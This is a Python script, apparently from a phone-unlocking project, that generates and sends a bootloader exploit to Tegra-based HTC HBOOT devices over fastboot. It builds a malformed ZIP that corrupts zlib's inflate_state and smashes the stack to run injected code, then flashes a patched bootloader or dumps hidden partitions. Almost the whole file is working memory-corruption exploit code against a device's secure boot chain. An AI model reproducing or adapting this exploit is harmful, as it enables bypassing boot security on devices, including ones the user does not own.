#!/usr/bin/env python3

try:
    import pyfastboot
except ImportError:
    print("Check requirements.txt - You need to install this library for your python 3 https://pypi.org/project/pyfastboot/")
    exit(1)
try:
    import keystone
except ImportError:
    print("Check requirements.txt - You need to install this library for your python 3 https://pypi.org/project/keystone-engine/")
    exit(1)

from pyfastboot import fastboot

import argparse
import time
import binascii
import os
import struct
import sys
import json
import math

import patcher
import utils
import consts
import payload


def get_zlib_compressor():
    import zlib
    return zlib.compressobj(
        level=0,
        method=zlib.DEFLATED,
        wbits=-15,
        memLevel=9,
        strategy=zlib.Z_NO_COMPRESSION
    )

def generate_file_content(zip_memcpy_data: bytes, gzip_header_addr: int) -> bytes:
    written_len = len(zip_memcpy_data) + consts.ZLIB_HEADER_SIZE
    if (written_len % 4) != 0:
        raise ValueError(f"Data is not 4 bytes aligned {written_len}")

    # Malloc filler + target inflate_state malloc size to keep
    data = bytes([0x69]) * 0x10

    #We need to calculate how much data will be actually written on this STORED and the next
    inflate_state_struct_fmt = "<IiiiiILLLIIIILLII"
    inflate_state_struct_len = struct.calcsize(inflate_state_struct_fmt)
    total_data_length = len(data) + inflate_state_struct_len

    # and then add filler to force a second STORED so the "hold" var isn't 0
    pre_filler = consts.ZLIB_STORED_LIMIT - total_data_length
    if pre_filler < 0:
        raise ValueError("Data exceeds STORED limit")
    total_data_length += pre_filler

    # We will actually use NAME mode but EXTRA will clear the length for us

    # Replace zlib inflate_state struct
    inflate_state_struct = struct.pack(
        inflate_state_struct_fmt,
        0x5,  # inflate_mode mode = EXTRA
        1,  # int last
        0,  # int wrap
        0,  # int havedict
        0x800,  # [0x10] int flags
        0x8000,  # unsigned dmax
        0,  # unsigned long check
        0,  # unsigned long total
        gzip_header_addr,  # [0x20]  gz_headerp head
        0xf,  # unsigned wbits
        0, # unsigned wsize
        0,  # unsigned whave
        0,  # [0x30] unsigned write
        0, # unsigned char FAR *window
        0,  # unsigned long hold
        0,  # unsigned bits
        total_data_length,  # [0x40] unsigned length
    )
    if len(inflate_state_struct) != inflate_state_struct_len:
        raise RuntimeError(
            "inflate_state_struct size mismatch!",
            len(inflate_state_struct),
            inflate_state_struct_len
        )
    data += inflate_state_struct

    data += bytes([0x58]) * pre_filler

    data += zip_memcpy_data

    return data

def generate_zip(stack_smash_count: int, code_addr: int, gzip_header_addr: int):
    import zipfile
    from io import BytesIO
    archive = BytesIO()
    zipfile.ZIP64_LIMIT = 1 << 32

    stack_data_padding = bytes([0x12, 0x34, 0x45])
    code_addr = struct.pack("<L", code_addr)
    stack_data = stack_data_padding + code_addr * (stack_smash_count - 3) + bytes(8)
    with (zipfile.ZipFile(archive, 'w') as zip_archive):
        data = generate_file_content(stack_data, gzip_header_addr)

        # Assemble zip with android-info.txt data and set special size to trigger bug
        zinfo = zipfile.ZipInfo('android-info.txt')
        zinfo.compress_type = zipfile.ZIP_DEFLATED
        with zip_archive.open(zinfo, mode='w') as zip_write:
            zip_write._compressor = get_zlib_compressor()
            zip_write.write(data)
            zip_write._file_size = 0xFFFFFFFF

    zip_buf = bytearray(archive.getbuffer())
    archive.close()

    #Check if stack data was written as one contiguous data
    if stack_data not in zip_buf:
        raise RuntimeError("ZIP data to write not fully present or intact in ZIP data")

    patcher.apply_patch_info(zip_buf, patcher.PatchInfoData(
        name = "STORED header fixup",
        description = "Replace second STORED header + padding with extra stack data",
        groups = ["test"],
        search = patcher.CodeSearch(
            name = "zlib header",
            code = stack_data_padding,
            matches = {
                -5: bytes([1]),
                -4: struct.pack("<H", len(stack_data)),
                3: code_addr,
            },
        ),
        count = 1,
        patches = [
            patcher.PatchData(
                offset = -5,
                size = 8,
                arch = "data",
                code = code_addr * 2,
            )
        ],
    ))

    return zip_buf

def connect_target(args, device_fastboot):
    serial = args.serial
    if serial is not None:
        device_serials = []
        for device in device_fastboot.Devices():
            device_serials.append(device.serial_number)
        if serial not in device_serials:
            serial += "\0\0"
        if serial not in device_serials:
            print(f"Device with {args.serial} not found!")
            exit(1)
    device_fastboot.ConnectDevice(serial=serial, default_timeout_ms=30_000)

def get_target_vars(args, device_fastboot: fastboot.FastbootCommands):
    connect_target(args, device_fastboot)
    device_getvar = device_fastboot.Getvar('all')

    if device_getvar["platform"] != "HBOOT-T30S":
        print("Device is not a hboot Tegra platform")
        exit(1)

    if device_getvar["boot-mode"] != "RUU":
        device_fastboot.Oem(command="rebootRUU")
        print("Switching device to RUU mode, please run this again after reboot finishes")
        exit(1)

    if int(device_getvar["devpower"]) < 20:
        print(f"Please charge device more than 20% to be safe, current: {device_getvar['devpower']}%")
        exit(1)

    device_product = device_getvar["product"]
    if len(device_product) == 0:
        print("No product getvar")
        exit(1)
    if args.product is None:
        args.product = device_product
    elif args.product != device_product:
        print(f"Expected product {args.product} but device has {device_product}")

    device_hboot_ver = device_getvar["version-bootloader"]
    if len(device_hboot_ver) == 0:
        print("No version-bootloader getvar")
        exit(1)
    if args.version is None:
        args.version = device_hboot_ver
    elif args.version != device_hboot_ver:
        print(f"Expected version {args.version} but device has {device_hboot_ver}")

    device_serial = device_getvar["serialno"]
    if len(device_serial) == 0:
        print("No serialno getvar")
        exit(1)
    if args.serial is None:
        args.serial = device_serial
    elif args.serial != device_serial:
        print(f"Expected serial {args.serial} but device has {device_serial}")

def identify_target_hboot(args):
    if args.product is None:
        print("No device product defined!")
        exit(1)
    if args.version is None:
        print("No device hboot version defined!")
        exit(1)

    for hboot_cfg_candidate in consts.HBOOT_CONFIG:
        #Check if device has hboot that we have data of

        symbol_match = False
        for symbol in hboot_cfg_candidate["symbols"]:
            if "board_" + args.product == symbol:
                symbol_match = True
                break
        if not symbol_match:
            continue

        for version_str, version_params in hboot_cfg_candidate["versions"].items():
            if version_str == args.version:
                return {
                    "device": hboot_cfg_candidate["device"],
                    "version": version_str,
                    "params": version_params,
                    "symbols": hboot_cfg_candidate["symbols"],
                }

    raise ValueError(f"Couldn't identify this HBOOT device {args.product} version {args.version}")

def generate_torpedo(args, hboot_cfg: dict):
    os.makedirs("output", exist_ok=True)
    if args.bl is not None:
        with open(args.bl, 'rb') as f:
            bl_data = bytearray(f.read())
            while len(bl_data) < consts.HBOOT_LENGTH:
                bl_data += b'\0'
            if len(bl_data) != consts.HBOOT_LENGTH:
                print("hboot payload must be 0x%x instead of 0x%x or might get stuck booting" % (consts.HBOOT_LENGTH, len(bl_data)))
                exit(1)

        if len(bl_data) < 60:
            print(f"Provided bootloader binary is too small")
            exit(1)

        hboot_plat1 = bl_data[16:20].decode("ascii")
        hboot_plat2 = bl_data[48:58].decode("ascii")
        if hboot_plat1 != "T30S":
            print(f"Expected T30S at header, got {hboot_plat1}")
            exit(1)
        if hboot_plat2 != "HBOOT-T30S":
            print(f"Expected HBOOT-T30S at header, got {hboot_plat2}")
            exit(1)

        symbol_match = False
        for symbol in hboot_cfg["symbols"]:
            if bytes(symbol, "ascii") in bl_data:
                symbol_match = True
                break
        if not symbol_match:
            print(f"This bootloader doesn't seem to be for same model for the identified device")
            exit(1)

        if not args.test_group:
            args.test_group = "patched"
        print(f"-> Applying {args.test_group} patches")
        patcher.apply_hboot_patches(bl_data, args.test_group)

        hboot_ver = bl_data[4:13].decode("ascii")
        with open(f"output{os.sep}bootloader_{args.test_group}_{hboot_cfg['device']}_{hboot_ver}.img", 'wb') as f:
            f.write(bl_data)
    else:
        bl_data = None

    if "extract_stack_base" in args and args.extract_stack_base is True:
        print(f"Stack base is: {hex(utils.get_stack_base(bl_data))}")
        exit(0)

    if args.stack_base <= 0:
        args.stack_base = hboot_cfg["params"]["stack_base"]
    if args.fastboot_start <= 0:
        args.fastboot_start = hboot_cfg["params"]["fastboot_start"]

    stack_smash_count = 0x400 #Max count is 0x2000, but 0x100 is enough already on HOX 1.72
    exploit_buf, zip_loader_addr, gzip_header_addr = payload.prepare_payload(
        context=payload.PayloadContext(
            args=args,
            bl_data=bl_data,
            vars_size=0x100
        ),
        symbols = hboot_cfg["symbols"],
        stack_smash_count = stack_smash_count,
        stack_base = args.stack_base
    )

    print(f"-> Generating zip, zip loader 0x{zip_loader_addr:x}, gz header 0x{gzip_header_addr:x}")
    zip_buf = generate_zip(stack_smash_count, zip_loader_addr, gzip_header_addr)

    print(f"-> Assembling final binary, exploit buf len 0x{len(exploit_buf)}")
    payload_buf = utils.zip_slice(zip_buf, consts.PAYLOAD_ZIP_RESERVED, exploit_buf)
    if exploit_buf != payload_buf[consts.PAYLOAD_ZIP_RESERVED:-consts.ZIP_EOCD_SIZE]:
        raise RuntimeError("Exploit buf not placed correctly")

    payload_path = f"output{os.sep}payload_{hboot_cfg['device']}_{hboot_cfg['version']}.zip"
    with open(payload_path, 'wb') as f:
        f.write(payload_buf)

    return payload_path

dumper_state: dict|None = None

def device_backup_path(args):
    return f"backup{os.sep}{args.product}{os.sep}{args.serial}_{args.version}"

def info_callback(args, msg: fastboot.FastbootMessage):
    global dumper_state
    if msg.header != b"INFO":
        text = str(msg.message, "ascii")
        header = str(msg.header, "ascii")
        if len(text) == 0:
            print(f"Device - {header}")
        else:
            print(f"Device - {header}: {text}")
    else:
        text_has_dumper_json = msg.message.startswith(b"# DUMP {")
        if dumper_state is not None or text_has_dumper_json:
            handle_dumper(args, msg, text_has_dumper_json)
        else:
            print(f"Device: {str(msg.message, "ascii")}")

def dumper_process_buffer(buffer: bytearray):
    global dumper_state

    buffer_len = len(buffer)

    data = bytearray()
    i = 0
    while i < buffer_len:
        byte = buffer[i]
        i += 1
        if byte == 0:
            print(f"BUFFER: {len(buffer)} {buffer.hex(' ')}")
            raise ValueError(f"Dumper line has a 0")
        elif byte == 1:
            byte = 0
        elif byte == 2:
            byte = 0x25
        elif byte == 3:
            byte = buffer[i]
            i += 1
        data += bytes([byte])

    if len(data) % 4 != 0:
        print(f"DATA: {len(data)} {data.hex(' ')}")
        raise ValueError(f"Dumper line data not aligned 0x{len(data):x}")

    addr = struct.unpack("<I", data[:4])[0]
    data = data[4:]
    if addr != dumper_state["address"]:
        raise ValueError(f"Dumper line address is 0x{addr:x} but 0x{dumper_state["address"]:x} was expected")

    dumper_state["data"] += data
    data_len = len(data)
    dumper_state["address"] += data_len
    dumper_state["progress_len"] += data_len

def handle_dumper(args, msg, is_json):
    global dumper_state
    if is_json:
        text = str(msg.message, "ascii")
        info = json.loads(text[7:])
        if info["state"] == "start":
            info["length"] = int(info["length"], 16)
            print(f"Device - Reading partition {info["partition"]} len 0x{info["length"]:x}")
            if dumper_state is not None:
                raise ValueError("Dumper state already exists!")
            dumper_state = {
                "info": info,
                "buffer": bytearray(),
                "data": bytearray(),
                "address": 0,
                "progress_len": 0,
                "time_start": time.time(),
            }
        elif info["state"] == "done":
            if dumper_state is None:
                raise ValueError("Dumper state doesn't exist!")
            if dumper_state["info"]["partition"] != info["partition"]:
                raise ValueError(f"Dumper state partition is {dumper_state["info"]["partition"]} but device was dumping {info["partition"]}!")
            dumper_state["info"]["crc"] = int(info["crc"], 16)
            if len(dumper_state["buffer"]):
                dumper_process_buffer(dumper_state["buffer"])
            info_partition = dumper_state["info"]["partition"]
            info_length = dumper_state["info"]["length"]
            info_crc = dumper_state["info"]["crc"]
            data_len = len(dumper_state["data"])
            time_total = math.ceil(time.time() - dumper_state["time_start"])
            time_m = math.floor(time_total / 60)
            time_s = time_total % 60
            print(f"Device - Finished partition {info_partition} len 0x{data_len:x}/0x{info_length:x} crc 0x{info_crc:x} at {time_m}:{time_s:02} minutes")
            if args.mode == "partitions_crc" and data_len != 0:
                raise ValueError(f"Received 0x{data_len:x} data when only CRC was expected!")

            if args.mode == "backup":
                if data_len != info_length:
                    raise ValueError(f"Received 0x{data_len:x} data and 0x{info_length:x} was expected!")
                data_crc = binascii.crc32(dumper_state["data"])
                if data_crc != info_crc:
                    raise ValueError(f"Received data CRC is 0x{data_crc:x} but device data CRC is 0x{info_crc:x}")
                backup_path = device_backup_path(args)
                os.makedirs(backup_path, exist_ok=True)
                backup_path = f"{backup_path}{os.sep}{info_partition}.img"
                with open(backup_path, "wb") as f:
                    f.write(dumper_state["data"])
                print(f"Stored {info_partition} len 0x{info_length:x} at {backup_path}")
            dumper_state = None
        else:
            raise ValueError(f"Unknown dumper state! {info["state"]}")

    elif dumper_state is not None:
        message = bytearray(msg.message)
        if dumper_state is None:
            raise ValueError("Dumper state doesn't exist!")

        #print(f"MSG: {len(message)} - {message.hex(' ')}")
        if not message.startswith(consts.DUMP_START_MARKER):
            #Store current message in buffer
            dumper_state["buffer"] += message
        else:
            buffer = dumper_state["buffer"]

            #Trim the marker and store the start of new line
            dumper_state["buffer"] = message[len(consts.DUMP_START_MARKER):]

            if len(buffer) == 0:
                return

            dumper_process_buffer(buffer)

            if 0x8000 <= dumper_state["progress_len"]:
                dumper_state["progress_len"] = 0
                data_len = len(dumper_state["data"])
                total_len = dumper_state["info"]["length"]
                if data_len < total_len:
                    progress = math.ceil(data_len / total_len * 100)
                    print(f"Device - Receiving partition {dumper_state["info"]["partition"]} {progress}% 0x{data_len:x} / 0x{total_len:x}")

def fire_torpedo(args):
    if args.only_zip:
        device_fastboot = None
    else:
        device_fastboot = fastboot.FastbootCommands()
        if not args.no_check_fastboot_vars:
            get_target_vars(args, device_fastboot)

    hboot_cfg = identify_target_hboot(args)
    print(f"-> Target hboot device {hboot_cfg['device']} ({args.product}) version {hboot_cfg['version']}")

    if args.serial is None:
        print("No device serial defined!")
        exit(1)

    if args.mode == "flash" and not args.no_backup_like_to_live_dangerously:
        backup_path = device_backup_path(args)
        issues = []
        need_backup_mode = False
        missing_adb_partitions = []
        if not backup_path or not os.path.exists(backup_path):
            need_backup_mode = True
        else:
            for part in consts.DUMP_PARTITIONS:
                backup_part_path = backup_path + os.sep + part["name"] + ".img"
                line = ""
                if not os.path.exists(backup_part_path):
                    line = f"Backup for this device's '{part["name"]}' partition doesn't exist or not found at '{backup_part_path}'"
                else:
                    file_size = os.path.getsize(backup_part_path)
                    if file_size != part["length"]:
                        line = f"Backup for this device's '{part["name"]}' partition {file_size} is not expected size {part["length"]}"

                if len(line):
                    if part["hidden"]:
                        need_backup_mode = True
                    else:
                        missing_adb_partitions.append(part["name"])
                    issues.append(line)

        if len(issues):
            print("!!> Issues detected:")
            for issue in issues:
                print(f"- {issue}")
            if need_backup_mode:
                print("!!> Please use '--mode backup' to obtain backup of hidden partitions")
            if len(missing_adb_partitions):
                os.makedirs(backup_path, exist_ok=True)
                print(f"!!> Please run these commands with your device in android recovery to obtain the backups or place them manually at {backup_path}:")
                for part_name in missing_adb_partitions:
                    backup_part_path = backup_path + os.sep + part_name + ".img"
                    print(f"adb pull /dev/block/platform/sdhci-tegra.3/by-name/{part_name} {backup_part_path}")
            exit(1)


    payload_path = generate_torpedo(args, hboot_cfg)

    if device_fastboot is None:
        print(f"-> Generated payload at {payload_path}")
        exit(0)

    try:
        if args.no_check_fastboot_vars:
            print(f"-> Checking fastboot vars")
            get_target_vars(args, device_fastboot)

        print(f"-> Sending payload over fastboot")
        device_fastboot.Download(source_file=payload_path, info_cb=lambda msg: info_callback(args, msg))
    finally:
        os.remove(payload_path)

    print(f"-> Executing payload over fastboot")
    try:
        device_fastboot.Flash(partition="zip", timeout_ms=60_000, info_cb=lambda msg: info_callback(args, msg))
    except fastboot.usb_exceptions.ReadFailedError as e:
        if str(e.usb_error).startswith("LIBUSB_ERROR_TIMEOUT"):
            print(f"ERROR: Device is not responding! please restart device by long pressing power button")
            exit(1)
        elif str(e.usb_error).startswith("LIBUSB_ERROR_IO"):
            if args.mode == "flash":
                print(f"Device disconnected, check if booted successfully to patched bootloader")
            else:
                print(f"Device disconnected")
        else:
            raise e

def main():
    args = argparse.ArgumentParser(description='Generates ZIP to be flashed with Tegra hboot')
    args.add_argument("--bl", help="Bootloader to flash")
    args.add_argument("--serial", help="Device serial to connect with fastboot, optional")
    args.add_argument("--advanced", action="store_true", help="Unlocks advanced options")
    args.add_argument("--mode", choices=["flash", "backup", "partitions_crc"], help="What payload mode to run")
    if "--advanced" in sys.argv:
        args.add_argument("--test_group", help="Only use for developing")
        args.add_argument("--no_backup_like_to_live_dangerously", action="store_true", help="Bypasses requiring a backup folder before flashing")
        args.add_argument("--backup_all", action="store_true", help="Backups the rest of partitions that are important but obtainable via android recovery")
        args.add_argument("--only_zip", action="store_true", help="Only generate zip without using fastboot")
        args.add_argument("--no_check_fastboot_vars", action="store_true", help="Don't check device fastboot getvar values, only for developing")
        args.add_argument("--product", help="Target device product, obtained from fastboot if absent")
        args.add_argument("--version", help="Target device bootloader version, obtained from fastboot if absent")
        args.add_argument("--extract_stack_base", action="store_true", help="Extracts the stack base value from provided bl")
        #args.add_argument("--extract_fastboot_start", action="store_true", help="Extracts the fastboot start address, needs device with recovery that has adb and devmem available")
        args.add_argument("--stack_base", help="Address where stack base is, if not provided is extracted from bl")
        args.add_argument("--fastboot_start", help="Address where fastboot downloaded data starts, if not provided the known value is used if available")
    args = args.parse_args()
    if not args.advanced:
        args.test_group = None
        args.no_backup_like_to_live_dangerously = False
        args.backup_all = False
        args.only_zip = False
        args.no_check_fastboot_vars = False
        args.product = None
        args.version = None
        args.stack_base = None
        args.fastboot_start = None

    if args.mode == "flash" and args.bl is None:
        print("Bootloader is not specified!")
        exit(1)

    if args.mode not in ["backup", "dump_crc"] and args.backup_all:
        print("--backup_all requested but not relevant, wrong --mode?")
        exit(1)

    if args.stack_base is None:
        args.stack_base = 0

    if args.fastboot_start is None:
        args.fastboot_start = 0

    fire_torpedo(args)

    print("-> Finished")

if __name__ == '__main__':
    main()
